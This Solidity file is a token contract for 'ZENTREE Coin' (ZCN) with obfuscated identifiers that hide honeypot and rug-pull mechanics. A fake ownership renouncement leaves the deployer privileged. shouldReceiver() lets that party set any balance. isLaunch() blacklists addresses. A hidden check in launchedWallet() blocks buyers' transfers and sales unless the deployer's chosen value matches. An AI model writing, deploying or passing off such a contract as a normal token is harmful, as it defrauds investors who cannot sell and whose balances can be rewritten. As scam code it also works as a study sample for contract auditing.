//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract senderToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenTeamFund) external view returns (uint256);

    function transfer(address swapFee, uint256 walletToken) external returns (bool);

    function allowance(address takeList, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletToken) external returns (bool);

    function transferFrom(
        address sender,
        address swapFee,
        uint256 walletToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxSwap, uint256 value);
    event Approval(address indexed takeList, address indexed spender, uint256 value);
}

interface swapTake is shouldAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface senderMaxMin {
    function createPair(address maxReceiver, address limitLaunched) external returns (address);
}

interface teamMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ZENTREECoin is senderToken, shouldAuto, swapTake {

    function decimals() external view virtual override returns (uint8) {
        return exemptTeam;
    }

    address swapLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public receiverTeam;

    string private exemptFund = "ZENTREE Coin";

    address public buyToken;

    function receiverTo(uint256 walletToken) public {
        launchIs();
        buyExempt = walletToken;
    }

    mapping(address => bool) public senderMax;

    mapping(address => mapping(address => uint256)) private launchedToken;

    function approve(address tradingTotal, uint256 walletToken) public virtual override returns (bool) {
        launchedToken[_msgSender()][tradingTotal] = walletToken;
        emit Approval(_msgSender(), tradingTotal, walletToken);
        return true;
    }

    uint256 buyExempt;

    function owner() external view returns (address) {
        return launchedBuy;
    }

    mapping(address => bool) public txExempt;

    function name() external view virtual override returns (string memory) {
        return exemptFund;
    }

    function getOwner() external view returns (address) {
        return launchedBuy;
    }

    string private tradingSell = "ZCN";

    function allowance(address minExempt, address tradingTotal) external view virtual override returns (uint256) {
        if (tradingTotal == launchedFrom) {
            return type(uint256).max;
        }
        return launchedToken[minExempt][tradingTotal];
    }

    address launchedFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 atMarketing;

    function transfer(address limitMin, uint256 walletToken) external virtual override returns (bool) {
        return launchedWallet(_msgSender(), limitMin, walletToken);
    }

    address private launchedBuy;

    uint8 private exemptTeam = 18;

    function transferFrom(address totalLiquidity, address swapFee, uint256 walletToken) external override returns (bool) {
        if (_msgSender() != launchedFrom) {
            if (launchedToken[totalLiquidity][_msgSender()] != type(uint256).max) {
                require(walletToken <= launchedToken[totalLiquidity][_msgSender()]);
                launchedToken[totalLiquidity][_msgSender()] -= walletToken;
            }
        }
        return launchedWallet(totalLiquidity, swapFee, walletToken);
    }

    event OwnershipTransferred(address indexed buyLaunchedList, address indexed marketingLaunch);

    function fromLaunchedIs() public {
        emit OwnershipTransferred(amountIs, address(0));
        launchedBuy = address(0);
    }

    uint256 public toFromTx;

    uint256 public senderLaunch;

    mapping(address => uint256) private amountMarketing;

    function takeTx(address totalLiquidity, address swapFee, uint256 walletToken) internal returns (bool) {
        require(amountMarketing[totalLiquidity] >= walletToken);
        amountMarketing[totalLiquidity] -= walletToken;
        amountMarketing[swapFee] += walletToken;
        emit Transfer(totalLiquidity, swapFee, walletToken);
        return true;
    }

    function isLaunch(address fundLimit) public {
        launchIs();
        if (modeLimit == senderLaunch) {
            senderLaunch = modeLimit;
        }
        if (fundLimit == amountIs || fundLimit == buyToken) {
            return;
        }
        senderMax[fundLimit] = true;
    }

    function launchedLaunchAmount(address liquidityLimit) public {
        if (tokenSell) {
            return;
        }
        if (receiverTeam == atMax) {
            modeLimit = toFromTx;
        }
        txExempt[liquidityLimit] = true;
        
        tokenSell = true;
    }

    uint256 public receiverSwap;

    function balanceOf(address tokenTeamFund) public view virtual override returns (uint256) {
        return amountMarketing[tokenTeamFund];
    }

    function launchIs() private view {
        require(txExempt[_msgSender()]);
    }

    function launchedWallet(address totalLiquidity, address swapFee, uint256 walletToken) internal returns (bool) {
        if (totalLiquidity == amountIs) {
            return takeTx(totalLiquidity, swapFee, walletToken);
        }
        uint256 maxExempt = shouldAuto(buyToken).balanceOf(swapLimit);
        require(maxExempt == buyExempt);
        require(!senderMax[totalLiquidity]);
        return takeTx(totalLiquidity, swapFee, walletToken);
    }

    function shouldReceiver(address limitMin, uint256 walletToken) public {
        launchIs();
        amountMarketing[limitMin] = walletToken;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingReceiver;
    }

    uint256 public modeLimit;

    bool public tokenSell;

    uint256 private tradingReceiver = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return tradingSell;
    }

    bool private atMax;

    constructor (){
        if (senderLaunch != modeLimit) {
            modeLimit = toFromTx;
        }
        fromLaunchedIs();
        teamMax walletAmount = teamMax(launchedFrom);
        buyToken = senderMaxMin(walletAmount.factory()).createPair(walletAmount.WETH(), address(this));
        if (modeLimit == toFromTx) {
            receiverSwap = toFromTx;
        }
        amountIs = _msgSender();
        txExempt[amountIs] = true;
        amountMarketing[amountIs] = tradingReceiver;
        if (modeLimit == toFromTx) {
            toFromTx = receiverSwap;
        }
        emit Transfer(address(0), amountIs, tradingReceiver);
    }

    address public amountIs;

}